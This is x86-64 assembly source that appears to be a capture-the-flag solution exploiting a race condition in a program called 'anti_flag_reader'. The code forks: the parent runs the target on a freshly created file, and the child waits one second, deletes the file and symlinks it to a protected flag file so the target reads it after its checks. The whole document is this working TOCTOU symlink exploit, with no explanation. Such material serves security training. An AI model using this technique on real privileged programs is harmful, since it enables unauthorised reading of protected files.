.globl _start
.intel_syntax noprefix
_start:
	// rm('file')
	lea rdi, [rip+file]
	mov rax, 87
	syscall

	// open('file', O_RDWR|O_CREAT, 0o777)
	lea rdi, [rip+file]
	mov rsi, 0x42
	mov rdx, 511
	mov rax, 2
	syscall

	// fork
	mov rax, 57
	syscall

	cmp rax, 0
	je child

parent:
	// execve('anti_flag_reader', ['anti_flag_reader','file'])
	lea rdi, [rip+program]
	
	lea rax, [rip+program]
	mov [rsp+0x30], rax

	lea rax, [rip+file]
	mov [rsp+0x38], rax
	
	xor eax, eax
	mov [rsp+0x40], rax

	mov rsi, rsp
	add rsi, 0x30
	mov rdx, 0
	mov rax, 59
	syscall

child:
	// sleep(1) to give program time to make checks
	// because of this, wait 1sec before hitting enter 
	mov rax, 1
	mov [rsp+0x10], rax
	mov [rsp+0x18], rax
	lea rdi, [rsp+0x10]
	mov rax, 35
	syscall

	// rm('file')
	lea rdi, [rip+file]
	mov rax, 87
	syscall

	// ln -s /flag file
	lea rdi, [rip+flag]
	lea rsi, [rip+file]
	mov rax, 88
	syscall

	mov rdi, 0
	mov rax, 60
	syscall

program:
.string "/home/walk/anti_flag_reader"

file:
.string "file"

flag:
.string "/home/walk/flag"
